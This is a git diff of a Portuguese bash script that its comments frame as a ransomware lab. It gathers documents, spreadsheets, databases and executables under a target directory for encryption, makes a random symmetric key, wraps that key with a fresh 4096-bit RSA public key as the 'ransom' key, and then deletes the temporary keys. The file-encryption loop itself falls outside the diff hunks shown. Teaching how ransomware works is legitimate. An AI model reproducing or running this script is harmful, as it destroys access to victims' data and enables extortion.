@@ -2,12 +2,14 @@
 #################################
 # Autor: Rafael Vergani 	#
 # https://github.com/vergani 	#
+# Data: 29/09/2023		#
 #################################
 
-# local e exntesões de arquivos que serão atacadas neste lab:
-#arquivos=$(ls *.txt *.tar *.gzip *.doc *.docx *.xls *.xlsx *.ppt *.pptx *.sql 2>/dev/null)
-volume_alvo=/home/vergani/arquivos
+# local e extenções de arquivos que serão atacadas neste lab:
+volume_alvo=/dados
 arquivos=$(find $volume_alvo -print | egrep ".txt|.sql|.xls|.doc|.pdf|.py|.zip|.exe")
+
+#arquivos=$(ls *.txt *.tar *.gzip *.doc *.docx *.xls *.xlsx *.ppt *.pptx *.sql 2>/dev/null)
 
 # variavel que vai armazenar chave privada para decriptar
 chave=$(/usr/bin/dbus-uuidgen)
@@ -24,18 +26,18 @@ do
 
 done
 
-# vamos gerar um nova chave para proteger minha chave privada que precisareis depois no resgate
+# vamos gerar um nova chave para proteger minha chave privada necessária para resgate
 openssl genrsa -out resgate.pem 4096
 
-# extrair a chave publica que vai ser para encriptar a "chave da chave"
+# extrair a chave publica que vai ser usada para encriptar a "chave da chave"
 openssl rsa -in resgate.pem -outform PEM -pubout -out resgate-pub.pem
 
 # vamos pegar a chave simetrica e encriptar usando a chave publica recém criada
 openssl rsautl -in chave.key -out chave.enc -encrypt -pubin -inkey resgate-pub.pem
 
-# remover a chave privada temporaria
+# remover as chaves temporárias
 rm -rf chave.key
 rm -rf resgate-pub.pem
 
-# agora preciso apenas ter em mãos num local seguro remoto a chave privada que decripta a chave de resgate
+# opcional: mover para local seguro remoto a chave privada que decripta a chave de resgate
 #mv resgate.pem /home/vergani/
